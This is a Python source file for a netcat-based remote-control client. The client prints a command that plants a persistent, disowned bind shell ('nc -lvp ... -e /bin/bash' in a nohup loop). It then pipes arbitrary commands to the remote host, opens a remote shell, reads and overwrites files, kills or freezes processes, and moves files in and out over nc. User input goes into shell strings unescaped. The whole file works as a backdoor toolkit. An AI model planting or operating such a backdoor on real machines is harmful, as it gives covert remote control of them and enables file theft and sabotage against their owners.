import core, subprocess, os

class NCListActions(core.ListActions):
    def __init__(self, ip, port, time_out_resp, path_file_killer, save_logs, local_debug):
        super().__init__(ip, port, time_out_resp, path_file_killer, save_logs, local_debug)

        self.actions = [
            ["Kill ConED Server", lambda: self.closeConn() ],
            ["Get CMD Server", lambda: self.get_cmd_server()],
            ["Remote Shell", lambda: self.exec_cmd(f"nc {self.ip} {self.port}", capture_output=False, text=False)],
            ["Own Command", lambda: self.exec_remote_cmd(input("Enter Command: "))],
            ["Predefined Commands Utils", lambda: self.precmd(self.predefined_commands_utils)],
            ["Predefined Commands Process", lambda: self.precmd(self.predefined_commands_process, msg="Select Predefined Process Command: ")],
            ["Files", lambda: self.files()]
        ]

        if not os.path.exists("./share/"):
            os.makedirs("./share/")
        
        self.predefined_commands_utils = [
            ["Google", lambda: f"google-chrome {input('Site: ')}"],
            ["Firefox", lambda: f"firefox {input('Site: ')}"],
            ["Replace Content of a File", lambda: f"echo '{input('New Content: ')}' > {input('File Path: ')}"],
            ["Add Content of a File", lambda: f"echo '{input('New Content: ')}' >> {input('File Path: ')}"],
            ["View File Content", lambda: f"cat {input('File Path: ')}"],
            ["Who Am I", lambda: "whoami"],
        ]
        
        self.predefined_commands_process = [
            ["Process List", lambda: "ps -u $(whoami) -o user,pid,%cpu,stat,start,time,command"],
            ["Process list Resume", lambda: "ps -u $(whoami) "],
            ["Process List Filter", lambda: f"ps -u $(whoami) -o user,pid,%cpu,stat,start,time,command | grep {input('key word: ').lower()}"],
            ["Kill Process By PID", lambda: f"kill {input('pid: ')}"],
            ["Kill Process By Key Word", lambda: f"kill $(pgrep -u $(whoami) {input('key word: ').lower()})"],
            ["Freeze Process By Key Word", lambda: f"kill -STOP $(pgrep -u $(whoami) {input('key word: ').lower()}); sleep {input('seconds: ')}; kill -CONT $(pgrep -u $(whoami) {input('repite key word: ').lower()})"],
            ["Unfreeze Process By Key Word", lambda: f"kill -CONT $(pgrep -u $(whoami) {input('key word: ')})"],
        ]
    
    # Basic Functions
    def closeConn(self):
        self.exec_remote_cmd(f"rm {self.path_file_killer}")
        self.exec_cmd(f"echo 'whoami' | nc -w {self.time_out_resp} {self.ip} {self.port}")
        print("Connection closed.")
    
    def get_cmd_server(self):
        print(f"touch {self.path_file_killer}; nohup bash -c 'while [ -e \"{self.path_file_killer}\" ]; do nc -lvp {self.port} -e /bin/bash; done' > {self.path_file_killer if self.save_logs else '/dev/null'} 2>&1 & disown;\n")

    def exec_remote_cmd(self, cmd):
        if not self.local_debug:
            cmd = f"echo '{cmd}' | nc -w {self.time_out_resp} {self.ip} {self.port}"
        
        self.exec_cmd(cmd)

    def files(self):
        boolFiles, actdir = True, "./"

        while boolFiles:
            print(f"\nCurrent Dir: {actdir}")
            print(os.system(f"echo 'ls -la {actdir}' | nc -w {self.time_out_resp} {self.ip} {self.port}"))
            option =  input("Download, Upload, Change Dir, Home or Root Dir (d/u/c/h/r): ").lower()

            if actdir.endswith("/"):
                actdir = actdir[:-1]

            if option == 'd':
                file_path = actdir + "/" + input("File to Download Server: ")
                file_path_download = "./share/" + input("File Path to Download Client: ")

                self.exec_remote_cmd(f"nc -l -p {self.port} < {file_path}")
                self.exec_cmd(f"nc -w {self.time_out_resp} {self.ip} {self.port} > {file_path_download}", capture_output=False, text=False)
            
            elif option == 'u':
                file_path = "./share/" + input("File Path to Upload to Server: ")
                name_file = file_path.split("/")[-1]
                
                self.exec_remote_cmd(f"[ -f {name_file} ] && rm {name_file}; nc -l -p {self.port} -N > {name_file}")
                self.exec_cmd(f"nc {self.ip} {self.port} < {file_path}")
            
            elif option == 'c': 
                actdir += "/" + input("Change Dir to: ")
            
            elif option == 'h':
                actdir = "~/"
            
            elif option == 'r':
                actdir = "/"
            
            else:
                print(f"Error: Option {option} not valid")
                boolFiles = False